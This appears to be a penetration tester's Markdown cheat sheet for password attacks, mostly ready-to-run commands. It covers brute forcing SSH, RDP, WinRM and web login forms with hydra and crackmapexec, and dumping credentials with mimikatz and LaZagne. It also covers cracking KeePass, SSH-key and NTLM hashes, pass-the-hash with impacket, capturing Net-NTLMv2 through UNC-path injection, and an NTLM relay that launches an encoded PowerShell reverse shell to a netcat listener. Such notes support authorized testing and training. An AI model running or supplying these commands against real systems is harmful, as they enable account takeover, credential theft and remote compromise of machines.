# CrackStation

- https://crackstation.net/

# Word List Generator
## cewl

```bash
cewl <target_url>| tee passwords.txt
```

## hashcat Mutating Wordlists

- https://hashcat.net/wiki/doku.php?id=rule_based_attack

```bash
# Remove all number sequences
sed -i '/^1/d' demo.txt

echo \$1 > demo.rule

hashcat -r demo.rule --stdout demo.txt

hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```

- Demo rule 1:

```bash
$1 c
```

```bash
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231
```

- Demo rule 2:

```bash
$1
c
```

```bash
password1
Password
iloveyou1
Iloveyou
princess1
Princess
```

# Brute forcing on services
## SSH

### hydra

```bash
hydra -L users.txt -p "password" ssh://$IP
hydra -L "users" -p password.txt ssh://$IP
hydra -L users.txt -p password.txt ssh://$IP

hydra -L users.txt -p "password" 2222 ssh://$IP
```

### crackmapexec

```bash
crackmapexec smb $IP -u users.txt -p "password"
crackmapexec smb $IP -u users.txt -p "password" --continue-on-success
```

### SSH Private Key Passphrase

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 user@$IP

ssh2john id_rsa > ssh.hash

hashcat -h | grep -i "ssh"

cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

## RDP
### hydra

```bash
hydra -L users.txt -p "password" rdp://$IP
hydra -L "users" -p password.txt rdp://$IP
hydra -L users.txt -p password.txt rdp://$IP
```

### crackmapexec

```bash
crackmapexec rdp $IP -u users.txt -p "password"
crackmapexec rdp $IP -u users.txt -p "password" --local-auth
```

## WinRM

### crackmapexec

```bash
crackmapexec winrm $IP -u users.txt -p "password"
crackmapexec winrm $IP -u users.txt -p "password" --local-auth
```

# HTTP POST Login Form

## hydra

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

hydra -I -V -l admin -P /usr/share/wordlists/rockyou.txt -t 1 "http-get://$IP/:A=BASIC:F=401"

hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://$IP/PATH:username=^USER64^&password=^PASS64^:C=/:F=403'

# Example 1
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.64.117 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password\!"

# Example 2
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.129.64.117 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect password."
```

# Hash Identify

- https://hashes.com/en/tools/hash_identifier

```bash
hash-identifier
hashid hash
```


# Windows
## LaZagne

- https://github.com/AlessandroZ/LaZagne

```powershell
.\lazagne.exe all
```

## mimikatz

- https://github.com/gentilkiwi/mimikatz/wiki
- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#execute-commands
- https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz

```powershell
# mimikatz one-liner
.\mimikatz64.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "exit"

.\mimikatz64.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

.\mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# SAM & SYSTEM
./mimikatz64.exe "lsadump::sam  /system:C:\windows.old\windows\system32\SYSTEM /sam:C:\windows.old\windows\system32\SAM" "exit"
```

```
privilege::debug
mimikatz token::elevate
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::minidump lsass.dmp
```

## Password Manager (kdbx)

```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

keepass2john Database.kdbx > keepass.hash

john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash 

hashcat --help | grep -i "KeePass"

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

```bash
# Extract passwords from the KeePass database
kpcli --kdb prova.kdbx
kpcli:/> find .
kpcli:/> show -f 0
kpcli:/> show -f 1
kpcli:/> show -f 2
...
```

## NTLM
### Cracking NTLM

- [NTLM-to-password](https://ntlm.pw/)

```bash
Get-LocalUser

cd C:\tools\
.\mimikatz.exe

privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords

cat nelly.hash

hashcat --help | grep -i "ntlm"

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Passing NTLM

```bash
Get-LocalUser

cd C:\tools\
.\mimikatz.exe

privilege::debug
token::elevate
lsadump::sam

smbclient \\\\$IP\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@IP

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@$IP
```

### Cracking Net-NTLMv2

```bash
sudo responder -I tun0
```

On the victim machine:

```bash
dir \\$IP_MIO\\\test

# msql
xp_dirtree \\$IP_MIO\\\test
EXEC xp_dirtree \\$IP_MIO\\\test

# php request
http://sito.com/index.php?view=\\10.10.14.2\test
http://sito.com/index.php?view=//10.10.14.2/test
```

```bash
hashcat --help | grep -i "ntlm"

hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force
```

### Relaying Net-NTLMv2

When you fail to crack the password obtained via responder, you may consider using the hash to access another machine via _relay attack_.

First, let's generate a powershell code to get a reverse-shell:
- https://www.revshells.com/

We then use _impacket-ntlmrelayx_ to perform the attack:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t $IP_VITTIMA\TEST -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

Starting a listener to get the reverse-shell:

```bash
nc -nvlp 6666
```

On the victim machine:

```bash
dir \\$IP_MIO\test
```